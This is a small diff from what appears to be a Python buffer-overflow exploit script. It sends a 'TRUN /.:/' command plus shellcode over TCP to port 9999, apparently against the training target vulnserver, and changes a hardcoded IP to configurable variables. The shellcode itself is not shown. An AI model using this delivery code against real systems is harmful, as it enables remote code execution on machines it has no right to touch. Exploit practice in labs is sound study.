@@ -9,7 +9,7 @@ port = 9999 #CHANGE THIS
 
 try:
 	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-	s.connect(('192.168.10.162',9999))
+	s.connect((address,port))
 
 	s.send(('TRUN /.:/' + shellcode))
 	s.close()
